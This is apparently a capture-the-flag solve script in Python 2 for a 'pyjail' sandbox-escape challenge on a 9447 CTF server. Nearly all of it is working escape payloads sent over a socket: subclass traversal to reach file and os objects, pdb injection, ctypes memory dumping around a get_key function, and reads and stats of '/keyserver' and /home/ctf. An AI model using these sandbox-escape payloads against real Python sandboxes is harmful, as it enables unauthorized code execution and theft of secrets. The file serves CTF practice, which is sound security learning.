__author__='ChuyMichXinhDep'
import socket,hashlib

HOST = 'fuckpyjails.9447.plumbing'
PORT = 9447
def send_data(data=''):
	sock = socket.socket()
	sock.connect((HOST, PORT))
	sock.send(data + "\n")
	rec = sock.recv(4096)
	rec = sock.recv(4096)
	return rec
#send_data("{}[str(__import__('struct').unpack('LLl',__import__('inspect').currentframe()))]")
#send_data("{}[str(__import__('inspect').stack())]")
#print send_data ("s=socket.socket();{}[str(socket.socket(socket.AF_UNIX, socket.SOCK_STREAM).connect('/keyserver')),str(socket.socket(socket.AF_UNIX, socket.SOCK_STREAM).recv(1024))]") #get_key at 0x7f0c5b6e55f0
#str = "().__class__.__bases__[0].__subclasses__()[82](socket.AF_UNIX, socket.SOCK_STREAM).connect('/keyserver')"
#str = "__import__('dis').opname"
str = "__import__('pdb').set_trace()"
#print send_data ("{}[str(dir("+str+"))]")
#print send_data ("{}[str("+str+")]")
#print send_data ("{}[str(().__class__.__bases__[0].__subclasses__()[82](socket.AF_UNIX, socket.SOCK_STREAM).connect('/keyserver')), str(().__class__.__bases__[0].__subclasses__()[82](socket.AF_UNIX, socket.SOCK_STREAM).recv(64))]")
str = "().__class__.__bases__[0].__subclasses__()[40]('/keyserver').read()"


print send_data("{}[str(__import__('dis').dis(get_key))]")

#print send_data ("{}[str("+str+")]")
#print send_data ("__import__('pdb').set_trace()\nfrom ctypes import *\np hex(id(get_key))\n!value_address = id(get_key)\np libc.printf\nq")
#print send_data ("__import__('pdb').set_trace()\nimport socket\n!s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n!s.connect('/keyserver')\np s.fileno()\nq")
#print send_data ("__import__('pdb').set_trace()\nimport os\nos.listdir('/home/ctf')\nq")
#print send_data ("__import__('pdb').set_trace()\nhex(id(get_key)-id(get_key()))\nq")
'''
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key)-268688, 100))\np hexlify(string_at(id(get_key)-350608, 100))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key)-268688, 100))\np hexlify(string_at(id(get_key)-350608, 100))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key)-268688, 100))\np hexlify(string_at(id(get_key)-350608, 100))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key)-268688, 100))\np hexlify(string_at(id(get_key)-350608, 100))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
'''
'''
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key()), 100))\nq")
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key()), 100))\nq")
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key()), 100))\nq")
print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hexlify(string_at(id(get_key()), 100))\nq")
'''

print '================================='
#print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hex(id(get_key))\np hexlify(string_at(id(get_key)-0x5fde0, 70))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
print '================================='
#print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hex(id(get_key))\np hexlify(string_at(id(get_key)-0x5fde0, 70))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
print '================================='
#print send_data ("__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hex(id(get_key))\np hexlify(string_at(id(get_key)-0x5fde0, 70))\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]
print '================================='
print send_data ("__import__('os')\n__import__('pdb').set_trace()\nfrom ctypes import string_at\nfrom sys import getsizeof\nfrom binascii import hexlify\np hex(id(get_key))\np hexlify(string_at(id(get_key)-0x5fde0, 70))\ndir()\nq").split("(Pdb) (Pdb) (Pdb) (Pdb) '")[1].split("'\n(Pdb) Traceback")[0]

#print send_data("{}[str(__import__('ctypes').string_at(id(get_key.__code__),1024))]").find("9447")

str = "().__class__.__bases__[0].__subclasses__()[40]('/keyserver').read()"

# KeyError: 'posix.stat_result(st_mode=49663, st_ino=269340, st_dev=51713L, st_nlink=1, st_uid=1000, st_gid=1000, st_size=0, st_atime=1417346703, st_mtime=1417346639, st_ctime=1417346703)'
str = "{}[str(().__class__.__bases__[0].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].__dict__['stat']('/keyserver'))]"

str = "{}[str(().__class__.__bases__[0].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].__dict__['getuid']())]"
# geteuid '65534'
#

str = "{}[str(().__class__.__bases__[0].__subclasses__()[58].__init__.__globals__['linecache'].__dict__['os'].__dict__['stat']('/keyserver'))]"
print send_data(str)